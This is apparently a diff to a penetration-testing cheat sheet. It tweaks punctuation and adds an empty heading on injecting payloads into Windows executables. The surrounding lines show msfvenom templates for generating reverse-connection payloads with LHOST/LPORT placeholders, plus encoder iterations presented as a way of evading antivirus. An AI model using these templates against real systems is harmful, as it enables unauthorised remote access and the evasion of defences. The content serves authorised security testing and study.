@@ -494,7 +494,7 @@ set LPORT <port>
 msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -f <format> > <filename>
 ```
 - `<architecture>`: `x86`, `x64`
-- `<payload>`: Pick your poison from `msfvenom --list payloads`
+- `<payload>`: Pick your poison from `msfvenom --list payloads`.
 - `<format>`: Pick your poison from `msfvenom --list formats` e.g. `elf`, `exe`, `aspx`.
 
 #### Encoding Payloads
@@ -509,6 +509,8 @@ msfvenom --list encoders
 msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -i <iteration> -e <encoder> -f <format> > <filename>
 ```
 - Having more iterations increases the chances of evading AVs.
+
+#### Injecting Payloads into Window PEs
 
 ## ProFTPD 1.3.3c
 ```
